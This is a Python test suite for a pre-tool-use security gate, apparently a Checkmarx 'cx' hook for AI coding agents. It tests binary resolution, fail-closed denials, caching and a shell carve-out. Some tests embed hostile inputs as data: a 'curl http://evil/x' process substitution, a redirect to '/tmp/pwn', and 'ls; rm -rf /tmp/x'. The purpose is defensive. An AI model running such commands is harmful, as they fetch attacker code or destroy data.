    def test_valid_cx_binary_matching_path_cx_passes(self):
        # CX_BINARY set AND `cx` on PATH resolves to the SAME file → the gate validated the binary
        # the scanner will actually run → pass-through.
        p = self._make_exe()
        decision, code = run(bash("npm test"), which=p, version_state="ok",
                             authed=True, env={"CX_BINARY": p})
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_cx_binary_takes_precedence_over_different_path_cx(self):
        # NEW clean-flow: CX_BINARY wins over PATH cx (precedence CX_BINARY -> canonical -> PATH), and
        # stage-2 (cx_run.sh) uses the same precedence — so a PATH cx that differs from CX_BINARY is
        # simply ignored, not a mismatch deny. (No fail-open: the gate-validated binary is the one that scans.)
        p = self._make_exe()
        q = self._make_exe()
        decision, code = run(bash("npm test"), which=q, version_state="ok",
                             authed=True, env={"CX_BINARY": p})
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_cx_exe_precedence_canonical_over_path(self):
        # No CX_BINARY: _cx_exe() returns the canonical store path (absolute) over bare 'cx' (PATH).
        p = self._make_exe()
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: p
        try:
            self.assertEqual(cx_check._cx_exe(), p)
        finally:
            cx_check._canonical_cx = orig

    def test_cx_exe_precedence_cx_binary_over_canonical(self):
        # CX_BINARY (explicit pin) wins over the canonical store.
        p = self._make_exe()   # CX_BINARY
        q = self._make_exe()   # canonical store
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: q
        try:
            self.assertEqual(self._with_env({"CX_BINARY": p}, cx_check._cx_exe), p)
        finally:
            cx_check._canonical_cx = orig

    def test_cx_exe_falls_back_to_path_when_no_binary_no_canonical(self):
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: None
        try:
            self.assertEqual(cx_check._cx_exe(), "cx")
        finally:
            cx_check._canonical_cx = orig

    def test_exe_with_tier_reports_binary(self):
        p = self._make_exe()
        exe, tier = self._with_env({"CX_BINARY": p}, cx_check._cx_exe_with_tier)
        self.assertEqual(exe, p)
        self.assertEqual(tier, "binary")

    def test_exe_with_tier_reports_canonical(self):
        p = self._make_exe()
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: p
        try:
            exe, tier = self._with_env({}, cx_check._cx_exe_with_tier)
        finally:
            cx_check._canonical_cx = orig
        self.assertEqual(exe, p)
        self.assertEqual(tier, "canonical")

    def test_exe_with_tier_reports_path(self):
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: None
        try:
            exe, tier = self._with_env({}, cx_check._cx_exe_with_tier)
        finally:
            cx_check._canonical_cx = orig
        self.assertEqual(exe, "cx")
        self.assertEqual(tier, "path")

    def test_pin_note_empty_for_non_binary_tiers(self):
        self.assertEqual(cx_check._cx_binary_pin_note("canonical"), "")
        self.assertEqual(cx_check._cx_binary_pin_note("path"), "")

    def test_pin_note_present_for_binary_tier(self):
        note = cx_check._cx_binary_pin_note("binary")
        self.assertIn("CX_BINARY", note)
        self.assertIn("will NOT fix this", note)

    def test_below_min_deny_notes_cx_binary_pin_when_pinned(self):
        # A below-min cx resolved via CX_BINARY: re-running the upgrade bootstrap would NOT fix it
        # (the bootstrap only ever writes the canonical store) — the deny must say so explicitly.
        p = self._make_exe()
        decision, code = run(bash("npm test"), version_state="below", env={"CX_BINARY": p})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        ctx = LAST_OUTPUT["additionalContext"]
        self.assertIn("CX_BINARY is pinned to this exact binary", ctx)
        self.assertIn("will NOT fix this", ctx)

    def test_below_min_deny_omits_cx_binary_note_when_not_pinned(self):
        # No CX_BINARY set (this test harness's stubbed environ has no HOME/LOCALAPPDATA either, so
        # resolution falls through to the PATH tier) — the CX_BINARY-specific note must NOT appear.
        decision, code = run(bash("npm test"), version_state="below")
        self.assertEqual(decision, "deny")
        ctx = LAST_OUTPUT["additionalContext"]
        self.assertNotIn("CX_BINARY is pinned", ctx)

    def test_incapable_deny_notes_already_pinned_when_cx_binary_set(self):
        # The generic "(If the developer has an internal capable build, they can set CX_BINARY to
        # its absolute path.)" suggestion is confusing when CX_BINARY is ALREADY set to the same
        # incapable binary — the deny must clarify that a DIFFERENT build is needed.
        p = self._make_exe()
        decision, code = run(bash("npm test"), version_state="incapable", env={"CX_BINARY": p})
        self.assertEqual(decision, "deny")
        ctx = LAST_OUTPUT["additionalContext"]
        self.assertIn("CX_BINARY is ALREADY set", ctx)
        self.assertIn("DIFFERENT, capable build", ctx)

    def test_incapable_deny_omits_pin_clarification_when_not_pinned(self):
        decision, code = run(bash("npm test"), version_state="incapable")
        self.assertEqual(decision, "deny")
        ctx = LAST_OUTPUT["additionalContext"]
        self.assertNotIn("CX_BINARY is ALREADY set", ctx)

    def test_canonical_store_resolves_when_not_on_path(self):
        # cx ONLY in the canonical store (not on PATH), capable + authed → the gate passes with no
        # restart. This is the core clean-flow property: resolve by absolute path, no PATH dependency.
        p = self._make_exe()
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: p
        try:
            decision, code = run(bash("npm test"), which=None, version_state="ok", authed=True)
        finally:
            cx_check._canonical_cx = orig
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_incapable_in_canonical_store_off_path_is_capability_not_absent(self):
        # A freshly-installed INCAPABLE cx in the canonical store, not yet on PATH, must classify as
        # the TERMINAL capability_missing deny — NOT the misleading "cx is not installed" (the exact
        # QA-transcript regression: PATH-based resolution mis-reported an installed cx as absent).
        p = self._make_exe()
        orig = cx_check._canonical_cx
        cx_check._canonical_cx = lambda: p
        try:
            decision, code = run(bash("npm test"), which=None, version_state="incapable")
        finally:
            cx_check._canonical_cx = orig
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        reason = LAST_OUTPUT["permissionDecisionReason"]
        ctx = LAST_OUTPUT["additionalContext"]
        self.assertIn("MISSING the security-scanner subcommands", reason)
        self.assertNotIn("not installed", reason)
        # Terminal STOP wording: forbid the hand-place / cache-clear workaround, and don't loop.
        self.assertIn("TERMINAL", ctx)
        self.assertIn("hand-place", ctx)
        self.assertNotIn("/checkmarx-cli-setup (Upgrade)", ctx)

    def test_gate_probes_use_cx_binary(self):
        # _cx_version, _capabilities_present, _is_authenticated must all invoke CX_BINARY.
        p = self._make_exe()
        seen = []

        class _R:
            returncode = 0
            stdout = b"2.99.0"
            stderr = b""

        def fake(args, **kwargs):
            seen.append(args[0])
            return _R()

        old_env = cx_check.os.environ
        old_run = cx_check.subprocess.run
        old_cache = cx_check._AUTH_CACHE_FILE
        cx_check.os.environ = {"CX_BINARY": p}
        cx_check.subprocess.run = fake
        cx_check._AUTH_CACHE_FILE = os.path.join(tempfile.mkdtemp(), "nocache")
        try:
            cx_check._cx_version()
            cx_check._capabilities_present()
            cx_check._is_authenticated()
            self.assertTrue(seen and all(a == p for a in seen),
                            "all gate probes must invoke CX_BINARY; got %r" % seen)
        finally:
            cx_check.os.environ = old_env
            cx_check.subprocess.run = old_run
            cx_check._AUTH_CACHE_FILE = old_cache


class TestCachedProbe(unittest.TestCase):
    """The one deep caching module (_cached_probe) that version/auth/scanner share: memoize a probe
    keyed on an identity dict, honor a TTL, cache ONLY should_cache() results (so a fail-open stale
    positive can't happen), invalidate on any key change, and never trust a legacy/corrupt file, a
    non-numeric/bool `ts`, or a None cache path (fail-safe → re-probe)."""

    def setUp(self):
        self._dir = tempfile.mkdtemp()
        self.file = os.path.join(self._dir, "cache")
        self.calls = 0

    def _probe(self, value="ok"):
        def p():
            self.calls += 1
            return value
        return p

    def _cp(self, key, probe, should_cache=lambda r: True, ttl=1000, file=-1):
        return cx_check._cached_probe(self.file if file == -1 else file, ttl, key, probe, should_cache)

    def test_miss_then_hit_skips_reprobe(self):
        k = {"cx": "/p/cx", "mtime": 1.0}
        self.assertEqual(self._cp(k, self._probe("ok")), "ok")
        self.assertEqual(self._cp(k, self._probe("DIFFERENT")), "ok")  # served from cache
        self.assertEqual(self.calls, 1)

    def test_key_change_invalidates(self):
        self.assertEqual(self._cp({"cx": "/p/cx", "mtime": 1.0}, self._probe("ok")), "ok")
        self.assertEqual(self._cp({"cx": "/p/cx", "mtime": 2.0}, self._probe("new")), "new")
        self.assertEqual(self.calls, 2)

    def test_ttl_expiry_reprobes(self):
        k = {"cx": "/p/cx", "mtime": 1.0}
        self.assertEqual(self._cp(k, self._probe("ok"), ttl=1000), "ok")
        self.assertEqual(self._cp(k, self._probe("fresh"), ttl=-1), "fresh")  # already expired
        self.assertEqual(self.calls, 2)

    def test_only_should_cache_results_are_written(self):
        k = {"cx": "/p/cx", "mtime": 1.0}
        sc = lambda r: r == "ok"
        self.assertEqual(self._cp(k, self._probe("bad"), should_cache=sc), "bad")
        self.assertEqual(self._cp(k, self._probe("bad2"), should_cache=sc), "bad2")  # not cached
        self.assertEqual(self.calls, 2)
        self.assertFalse(os.path.exists(self.file))

    def test_none_file_disables_cache_and_never_raises(self):
        k = {"cx": "/p/cx", "mtime": 1.0}
        self.assertEqual(self._cp(k, self._probe("ok"), file=None), "ok")
        self.assertEqual(self._cp(k, self._probe("again"), file=None), "again")  # not cached
        self.assertEqual(self.calls, 2)

    def test_legacy_or_corrupt_file_is_ignored(self):
        for content in ("ok", "1700000000.0", "{not json", "[]"):
            self.calls = 0
            with open(self.file, "w", encoding="utf-8") as f:
                f.write(content)
            self.assertEqual(self._cp({"cx": "/p/cx", "mtime": 1.0}, self._probe("reprobed")), "reprobed")
            self.assertEqual(self.calls, 1)

    def test_non_numeric_or_bool_ts_is_ignored(self):
        for ts in ("not-a-number", True):
            self.calls = 0
            rec = {"value": "ok", "ts": ts, "cx": "/p/cx", "mtime": 1.0}
            with open(self.file, "w", encoding="utf-8") as f:
                f.write(json.dumps(rec))
            self.assertEqual(self._cp({"cx": "/p/cx", "mtime": 1.0}, self._probe("reprobed")), "reprobed")
            self.assertEqual(self.calls, 1)


class TestVersionCache(unittest.TestCase):
    """_version_state wiring: caches only 'ok'/'dev', keyed on binary + min-version; a swapped binary
    (stale key) re-probes and a failing state is never written (no stale 'ok' = fail open)."""

    def setUp(self):
        self._orig = {"cache": cx_check._VERSION_CACHE_FILE, "which": cx_check.shutil.which,
                      "uncached": cx_check._version_state_uncached, "environ": cx_check.os.environ}
        self._tmp = tempfile.mkdtemp()
        cx_check._VERSION_CACHE_FILE = os.path.join(self._tmp, "vcache")
        cx_check.os.environ = {}
        self._cx = os.path.join(self._tmp, "cx")
        with open(self._cx, "w") as f:
            f.write("#!/bin/sh\n")
        cx_check.shutil.which = lambda name: self._cx
        self.addCleanup(self._restore)

    def _restore(self):
        cx_check._VERSION_CACHE_FILE = self._orig["cache"]
        cx_check.shutil.which = self._orig["which"]
        cx_check._version_state_uncached = self._orig["uncached"]
        cx_check.os.environ = self._orig["environ"]

    def test_ok_is_cached(self):
        cx_check._version_state_uncached = lambda: "ok"
        self.assertEqual(cx_check._version_state(), "ok")
        cx_check._version_state_uncached = lambda: self.fail("must not re-probe a cached 'ok'")
        self.assertEqual(cx_check._version_state(), "ok")

    def test_failing_state_not_cached(self):
        cx_check._version_state_uncached = lambda: "below"
        self.assertEqual(cx_check._version_state(), "below")
        self.assertFalse(os.path.exists(cx_check._VERSION_CACHE_FILE))

    def test_stale_binary_reprobes(self):
        stale = {"value": "ok", "ts": cx_check.time.time(), "cx": "/other/cx", "mtime": 1.0, "min": "0.0.0"}
        with open(cx_check._VERSION_CACHE_FILE, "w", encoding="utf-8") as f:
            f.write(json.dumps(stale))
        cx_check._version_state_uncached = lambda: "incapable"
        self.assertEqual(cx_check._version_state(), "incapable")


class TestAuthCache(unittest.TestCase):
    """_is_authenticated wiring: caches only a True result, keyed on the resolved binary; a swapped
    binary re-validates (never rides a stale auth pass); a False is never cached."""

    def setUp(self):
        self._orig = {"cache": cx_check._AUTH_CACHE_FILE, "which": cx_check.shutil.which,
                      "probe": cx_check._auth_validate_probe, "environ": cx_check.os.environ}
        self._tmp = tempfile.mkdtemp()
        cx_check._AUTH_CACHE_FILE = os.path.join(self._tmp, "acache")
        cx_check.os.environ = {}
        self._cx = os.path.join(self._tmp, "cx")
        with open(self._cx, "w") as f:
            f.write("#!/bin/sh\n")
        cx_check.shutil.which = lambda name: self._cx
        self.addCleanup(self._restore)

    def _restore(self):
        cx_check._AUTH_CACHE_FILE = self._orig["cache"]
        cx_check.shutil.which = self._orig["which"]
        cx_check._auth_validate_probe = self._orig["probe"]
        cx_check.os.environ = self._orig["environ"]

    def test_true_is_cached(self):
        cx_check._auth_validate_probe = lambda: True
        self.assertTrue(cx_check._is_authenticated())
        cx_check._auth_validate_probe = lambda: self.fail("must not re-validate a cached True")
        self.assertTrue(cx_check._is_authenticated())

    def test_false_not_cached(self):
        cx_check._auth_validate_probe = lambda: False
        self.assertFalse(cx_check._is_authenticated())
        self.assertFalse(os.path.exists(cx_check._AUTH_CACHE_FILE))

    def test_swapped_binary_revalidates(self):
        cx_check._auth_validate_probe = lambda: True
        self.assertTrue(cx_check._is_authenticated())
        other = os.path.join(self._tmp, "cx2")
        with open(other, "w") as f:
            f.write("#!/bin/sh\n")
        cx_check.shutil.which = lambda name: other
        self.calls = 0

        def counting():
            self.calls += 1
            return True
        cx_check._auth_validate_probe = counting
        self.assertTrue(cx_check._is_authenticated())
        self.assertEqual(self.calls, 1)  # different binary → re-validated


class TestStatePathFallback(unittest.TestCase):
    def test_state_path_none_when_no_private_dir(self):
        # When no private agent-log dir is available, _state_path returns None so callers skip
        # caching/auditing rather than touch a world-writable location (review backlog #2).
        orig = cx_check._AGENT_LOG_DIR
        cx_check._AGENT_LOG_DIR = None
        try:
            self.assertIsNone(cx_check._state_path("cx_version_cache"))
        finally:
            cx_check._AGENT_LOG_DIR = orig


@unittest.skipUnless(SH and os.name != "nt", "needs POSIX sh + symlinks (Windows → manual)")
class TestShellCarveOutIsolation(unittest.TestCase):
    """The shell launcher's bootstrap carve-out (cx_check.sh) must be NO MORE permissive than
    the Python matcher. Driven with a minimal PATH that has sh/cat/dirname but NO python and
    NO cx: with no Python, the launcher's no-Python branch denies (exit 2) for anything that
    does NOT take the carve-out — so an exit 0 can come ONLY from the carve-out, isolating its
    decision deterministically regardless of the host's real cx/auth state."""

    def _run_isolated(self, hook_input):
        bindir = tempfile.mkdtemp()
        for tool in ("sh", "cat", "dirname", "tr"):
            src = shutil.which(tool)
            if not src:
                self.skipTest("missing %s on PATH" % tool)
            os.symlink(src, os.path.join(bindir, tool))
        proc = subprocess.run(
            [os.path.join(bindir, "sh"), CX_CHECK_SH],
            input=json.dumps(hook_input).encode(),
            capture_output=True,
            timeout=30,
            env={"PATH": bindir, "PYTHONUTF8": "1"},
        )
        return proc.returncode

    def test_clean_bootstrap_takes_carveout(self):
        # Clean bootstrap (the plugin's OWN bundled path) → carve-out fires (exit 0) even with
        # no Python available.
        self.assertEqual(self._run_isolated(bash('bash "%s" install' % BOOTSTRAP)), 0)

    def test_foreign_bootstrap_path_denied(self):
        # A script merely NAMED cx-bootstrap.sh but living outside the plugin must NOT take the
        # carve-out (review F-CR2): only the bundled absolute path qualifies → deny (exit 0).
        self.assertEqual(
            self._run_isolated(bash('bash "/tmp/cx-bootstrap.sh" install')), 0)

    def test_bash_dash_c_payload_denied(self):
        # `bash -c "<payload mentioning the bundled path>"` must NOT take the carve-out (review C1:
        # the matcher must reject `bash -c …`, not just chained commands) → deny (exit 0).
        self.assertEqual(
            self._run_isolated(bash('bash -c "echo %s install"' % BOOTSTRAP)), 0)

    def test_no_mode_denied(self):
        # The carve-out requires an explicit install/upgrade mode (review C1) → a bare invocation
        # of even the bundled path is denied (exit 0).
        self.assertEqual(self._run_isolated(bash('bash "%s"' % BOOTSTRAP)), 0)

    def test_process_substitution_falls_through_to_deny(self):
        # `<(…)` must NOT take the carve-out → no Python → deny (exit 0).
        payload = bash('bash "%s" install <(curl http://evil/x)' % BOOTSTRAP)
        self.assertEqual(self._run_isolated(payload), 0)

    def test_output_redirect_falls_through_to_deny(self):
        payload = bash('bash "%s" upgrade > /tmp/pwn' % BOOTSTRAP)
        self.assertEqual(self._run_isolated(payload), 0)


class TestDenyVerdictSchema(unittest.TestCase):
    """One fail-closed verdict SCHEMA, four emitters across two languages. The two shell heredocs run
    BECAUSE Python/cx is absent, so they cannot share the Python emitter's code — this contract test
    pins all four to the same JSON shape + exit 0, so a schema change can't silently diverge (the A2
    hand-copied-JSON risk).
    Claude Code uses nested hookSpecificOutput; Copilot CLI uses flat JSON — both are tested."""

    def _assert_schema(self, obj):
        """Assert Claude Code nested schema."""
        self.assertIsInstance(obj, dict)
        hso = obj.get("hookSpecificOutput")
        self.assertIsInstance(hso, dict, "missing hookSpecificOutput")
        self.assertEqual(hso.get("hookEventName"), "PreToolUse")
        self.assertEqual(hso.get("permissionDecision"), "deny")
        self.assertTrue(hso.get("permissionDecisionReason"), "reason must be non-empty")
        self.assertTrue(hso.get("additionalContext"), "context must be non-empty")

    def _assert_copilot_schema(self, obj):
        """Assert Copilot CLI flat JSON schema."""
        self.assertIsInstance(obj, dict)
        self.assertEqual(obj.get("permissionDecision"), "deny")
        self.assertTrue(obj.get("permissionDecisionReason"), "reason must be non-empty")

    def test_python_deny_emitter(self):
        decision, code = run(write("x"), which=None)  # cx absent → _deny(cx_absent)
        self.assertEqual((decision, code), ("deny", 2))
        self._assert_schema({"hookSpecificOutput": LAST_OUTPUT})

    def test_python_crash_emitter_claude(self):
        # _fail_closed_on_crash in Claude Code mode emits nested hookSpecificOutput.
        orig = cx_check._COPILOT_CLI_MODE
        cx_check._COPILOT_CLI_MODE = False
        out = io.StringIO()
        try:
            with redirect_stdout(out):
                cx_check._fail_closed_on_crash()
        finally:
            cx_check._COPILOT_CLI_MODE = orig
        self._assert_schema(json.loads(out.getvalue()))

    def test_python_crash_emitter_copilot(self):
        # _fail_closed_on_crash in Copilot CLI mode emits flat JSON.
        orig = cx_check._COPILOT_CLI_MODE
        cx_check._COPILOT_CLI_MODE = True
        out = io.StringIO()
        try:
            with redirect_stdout(out):
                cx_check._fail_closed_on_crash()
        finally:
            cx_check._COPILOT_CLI_MODE = orig
        self._assert_copilot_schema(json.loads(out.getvalue()))

    def _run_sh(self, argv, stdin, extra_env=None):
        bindir = tempfile.mkdtemp()
        for tool in ("sh", "cat", "dirname", "tr"):
            src = shutil.which(tool)
            if not src:
                self.skipTest("missing %s on PATH" % tool)
            os.symlink(src, os.path.join(bindir, tool))
        env = {"PATH": bindir, "PYTHONUTF8": "1", "HOME": "/nonexistent"}
        if extra_env:
            env.update(extra_env)
        proc = subprocess.run([os.path.join(bindir, "sh")] + argv, input=stdin,
                              capture_output=True, timeout=30, env=env)
        return proc.returncode, proc.stdout.decode("utf-8", "replace")

    @unittest.skipUnless(SH and os.name != "nt", "needs POSIX sh + symlinks (Windows → manual)")
    def test_shell_no_python_emitter(self):
        code, out = self._run_sh([CX_CHECK_SH], json.dumps({"tool_name": "Write"}).encode())
        self.assertEqual(code, 0)
        self._assert_schema(json.loads(out))

    @unittest.skipUnless(SH and os.name != "nt", "needs POSIX sh + symlinks (Windows → manual)")
    def test_shell_no_cx_emitter(self):
        cxrun = os.path.join(_HOOKS_DIR, "cx_run.sh")
        code, out = self._run_sh([cxrun, "hooks", "claude-pre-file-write"], b"", {"CX_BINARY": ""})
        self.assertEqual(code, 0)
        self._assert_schema(json.loads(out))


class TestLoggingWiring(unittest.TestCase):
    """The gate emits redacted gate_decision events; logging must not change the decision."""

    def test_deny_emits_gate_decision(self):
        tmp = tempfile.mkdtemp()
        decision, code = run(bash("npm test"), which=None, env={"CX_LOG_DIR": tmp})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        logfile = os.path.join(tmp, "checkmarx-devassist.jsonl")
        self.assertTrue(os.path.exists(logfile))
        with open(logfile, encoding="utf-8") as fh:
            recs = [json.loads(line) for line in fh if line.strip()]
        match = [r for r in recs if r.get("event") == "gate_decision"]
        self.assertTrue(match)
        self.assertEqual(match[-1]["decision"], "deny")
        self.assertEqual(match[-1]["reason_code"], "cx_absent")
        self.assertEqual(match[-1]["tool_name"], "Bash")
        self.assertEqual(match[-1]["exit_code"], 2)

    def test_pass_emits_gate_decision(self):
        tmp = tempfile.mkdtemp()
        decision, code = run(bash("npm test"), version_state="ok", authed=True,
                             env={"CX_LOG_DIR": tmp})
        self.assertIsNone(decision)
        with open(os.path.join(tmp, "checkmarx-devassist.jsonl"), encoding="utf-8") as fh:
            recs = [json.loads(line) for line in fh if line.strip()]
        self.assertTrue(any(r.get("decision") == "pass" and r.get("reason_code") == "ok"
                            and r.get("version_state") == "ok" for r in recs))


class TestMinVersionLoader(unittest.TestCase):
    def test_loads_a_real_semver(self):
        v = cx_check._load_min_version()
        self.assertIsInstance(v, tuple)
        self.assertEqual(len(v), 3)
        self.assertTrue(all(isinstance(n, int) for n in v))

    def test_never_falls_to_zero(self):
        self.assertNotEqual(cx_check._load_min_version(), (0, 0, 0))

    def test_undecodable_file_falls_closed_not_crash(self):
        # A non-UTF-8 byte (would raise UnicodeDecodeError under any locale) must fall CLOSED to
        # the fallback, never propagate an exception that would exit 1 = fail OPEN. (LE-2 regression)
        fd, p = tempfile.mkstemp()
        try:
            with open(p, "wb") as f:
                f.write(b"\xff\xfe not utf-8 garbage\n2.3.54\n")
            self.assertEqual(cx_check._load_min_version(p), cx_check._MIN_VERSION_FALLBACK)
        finally:
            os.close(fd)
            os.remove(p)


class TestCrashGuard(unittest.TestCase):
    """main() must fail CLOSED: an unexpected exception inside cx_check() becomes a deny.
    Claude Code: deny + exit 2 (exit 1 = uncaught traceback = fail-open).
    Copilot CLI: deny + exit 0 (non-zero exit = hook error = fail-open, not a denial).
    Real allow(0)/deny(2|0) SystemExit codes must pass through unchanged."""

    def test_unexpected_exception_denies_exit_2_claude(self):
        """Claude Code: crash → exit 2 + nested hookSpecificOutput deny."""
        def boom():
            raise RuntimeError("internal gate failure")
        orig_check = cx_check.cx_check
        orig_mode = cx_check._COPILOT_CLI_MODE
        cx_check.cx_check = boom
        cx_check._COPILOT_CLI_MODE = False
        out = io.StringIO()
        try:
            with self.assertRaises(SystemExit) as cm, redirect_stdout(out):
                cx_check.main()
        finally:
            cx_check.cx_check = orig_check
            cx_check._COPILOT_CLI_MODE = orig_mode
        self.assertEqual(cm.exception.code, 2)
        self.assertEqual(
            json.loads(out.getvalue())["hookSpecificOutput"]["permissionDecision"], "deny")

    def test_unexpected_exception_denies_exit_0_copilot(self):
        """Copilot CLI: crash → exit 0 + flat JSON deny (not exit 1, not nested format)."""
        def boom():
            raise RuntimeError("internal gate failure")
        orig_check = cx_check.cx_check
        orig_mode = cx_check._COPILOT_CLI_MODE
        cx_check.cx_check = boom
        cx_check._COPILOT_CLI_MODE = True
        out = io.StringIO()
        try:
            with self.assertRaises(SystemExit) as cm, redirect_stdout(out):
                cx_check.main()
        finally:
            cx_check.cx_check = orig_check
            cx_check._COPILOT_CLI_MODE = orig_mode
        self.assertEqual(cm.exception.code, 0)
        parsed = json.loads(out.getvalue())
        self.assertEqual(parsed["permissionDecision"], "deny")
        self.assertNotIn("hookSpecificOutput", parsed)  # must be FLAT, not nested

    def test_real_exit_codes_propagate(self):
        for code in (0,):
            orig = cx_check.cx_check
            cx_check.cx_check = (lambda c: (lambda: sys.exit(c)))(code)
            try:
                with self.assertRaises(SystemExit) as cm:
                    cx_check.main()
            finally:
                cx_check.cx_check = orig
            self.assertEqual(cm.exception.code, code)


class ScannerProbeCheckAuthTests(unittest.TestCase):
    """C5 machine-readable readiness probe: _probe_scanner_passthrough() consumes
    `cx hooks check-auth` (exit code + JSON), and falls back to the legacy --debug stderr
    marker on an older cx that predates the subcommand."""

    def _probe(self, run_stub):
        orig_run, orig_exe = cx_check.subprocess.run, cx_check._cx_exe
        cx_check.subprocess.run = run_stub
        cx_check._cx_exe = lambda: "cx"
        try:
            return cx_check._probe_scanner_passthrough()
        finally:
            cx_check.subprocess.run = orig_run
            cx_check._cx_exe = orig_exe

    def test_ready_exit0_scans(self):
        def stub(cmd, **kw):
            return _fake_proc(
                stdout=b'{"scannerReady":true,"authenticated":true,"licensed":true,"state":"ready"}',
                returncode=0)
        self.assertEqual(self._probe(stub), cx_check._SCANNER_SCAN)

    def test_unlicensed_exit1_blocks(self):
        # Authenticated but no AI license → cx runs the scanner in pass-through (NO scan), so the
        # probe must report UNLICENSED (a blocking state), NOT _SCANNER_SCAN — else the gate fails OPEN.
        def stub(cmd, **kw):
            return _fake_proc(
                stdout=b'{"scannerReady":false,"authenticated":true,"licensed":false,'
                       b'"state":"unlicensed"}',
                returncode=1)
        self.assertEqual(self._probe(stub), cx_check._SCANNER_UNLICENSED)

    def test_unauthenticated_exit2_passthrough(self):
        def stub(cmd, **kw):
            return _fake_proc(
                stdout=b'{"scannerReady":false,"authenticated":false,"licensed":false,'
                       b'"state":"unauthenticated"}',
                returncode=2)
        self.assertEqual(self._probe(stub), cx_check._SCANNER_PASSTHROUGH)

    def test_spawn_error_is_unknown(self):
        def stub(cmd, **kw):
            raise FileNotFoundError("no cx")
        self.assertEqual(self._probe(stub), cx_check._SCANNER_UNKNOWN)

    def test_old_cx_falls_back_to_legacy_passthrough(self):
        # check-auth: unknown subcommand → no JSON; legacy claude-pre-file-write shows the marker.
        def stub(cmd, **kw):
            if "check-auth" in cmd:
                return _fake_proc(stderr=b'Error: unknown command "check-auth"',
                                  stdout=b"", returncode=1)
            return _fake_proc(
                stderr=b"hooks: running in pass-through mode (not authenticated)\n", returncode=0)
        self.assertEqual(self._probe(stub), cx_check._SCANNER_PASSTHROUGH)

    def test_old_cx_falls_back_to_legacy_scan(self):
        def stub(cmd, **kw):
            if "check-auth" in cmd:
                return _fake_proc(stderr=b"unknown command", stdout=b"", returncode=1)
            return _fake_proc(stderr=b"hooks: registering security guardrails\n", returncode=0)
        self.assertEqual(self._probe(stub), cx_check._SCANNER_SCAN)

    def test_old_cx_falls_back_to_legacy_unlicensed(self):
        # Old cx (no check-auth): the --debug stderr shows the NO-LICENSE marker → UNLICENSED (block),
        # not a clean scan — the legacy path must also be fail-closed on the unlicensed pass-through.
        def stub(cmd, **kw):
            if "check-auth" in cmd:
                return _fake_proc(stderr=b"unknown command", stdout=b"", returncode=1)
            return _fake_proc(
                stderr=b"hooks: running in pass-through mode (no AI feature license)\n", returncode=0)
        self.assertEqual(self._probe(stub), cx_check._SCANNER_UNLICENSED)


class TestScannerUnlicensedGate(unittest.TestCase):
    """PL-0 flow: authenticated-but-unlicensed → cx scanner runs in pass-through (NO scan), so the gate
    BLOCKS by default and only allows (unscanned) under an explicit CX_ALLOW_UNLICENSED=1 opt-out."""

    def test_unlicensed_denies_by_default(self):
        decision, code = run(write("x"), authed=True,
                             scanner_state=cx_check._SCANNER_UNLICENSED)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_unlicensed_allows_with_explicit_override(self):
        decision, code = run(write("x"), authed=True,
                             scanner_state=cx_check._SCANNER_UNLICENSED,
                             env={"CX_ALLOW_UNLICENSED": "1", "CX_LOG_DISABLE": "1"})
        self.assertEqual(decision, "allow")
        self.assertEqual(code, 0)


class TestReadonlyAllowlist(unittest.TestCase):
    """Read-only Bash commands skip the gate entirely (even with cx absent), so a plain `ls` isn't
    blocked during setup — but only as a bare, shape-guarded command, Bash-only, unless opted out."""

    def test_readonly_allowed_even_when_cx_absent(self):
        decision, code = run(bash("ls -la /tmp"), which=None)
        self.assertIsNone(decision)  # silent pass — never reached the cx-absent deny
        self.assertEqual(code, 0)

    def test_readonly_various_commands_allowed(self):
        for c in ("pwd", "cat file.txt", "grep -r TODO src", "wc -l a.py", "head -n5 x"):
            decision, code = run(bash(c), which=None)
            self.assertIsNone(decision, "%r should be allowed read-only" % c)
            self.assertEqual(code, 0)

    def test_readonly_with_chaining_is_gated(self):
        # `;` disqualifies the bare-command guard, so it must fall through to the cx-absent deny.
        decision, code = run(bash("ls; rm -rf /tmp/x"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_readonly_with_redirect_is_gated(self):
        decision, code = run(bash("cat secret > /tmp/out"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_non_readonly_command_still_gated(self):
        decision, code = run(bash("python app.py"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_readonly_is_bash_only_powershell_gated(self):
        decision, code = run({"tool_name": "PowerShell", "tool_input": {"command": "ls"}}, which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_cx_gate_all_commands_disables_allowlist(self):
        decision, code = run(bash("ls"), which=None, env={"CX_GATE_ALL_COMMANDS": "1"})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)


class TestFreshCredentialAuthMessage(unittest.TestCase):
    """A validate failure right after a fresh login gets a distinct 'wait, do NOT re-login' deny
    (re-running cx auth login revokes the token and restarts the wait — the loop we observed)."""

    def _run_unauthed(self, fresh):
        orig = cx_check._credential_is_fresh
        cx_check._credential_is_fresh = lambda within_seconds=180: fresh
        try:
            return run(bash("npm test"), authed=False)
        finally:
            cx_check._credential_is_fresh = orig

    def test_fresh_credential_says_wait_not_relogin(self):
        decision, code = self._run_unauthed(fresh=True)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        reason = LAST_OUTPUT["permissionDecisionReason"]
        self.assertIn("Do NOT re-run", reason)
        self.assertIn("REVOKES", reason)

    def test_stale_credential_uses_generic_message(self):
        decision, code = self._run_unauthed(fresh=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        self.assertNotIn("REVOKES", LAST_OUTPUT["permissionDecisionReason"])


class TestCopilotCLIInputs(unittest.TestCase):
    """Gate behaviour with Copilot CLI tool names ('command', 'create', 'edit').
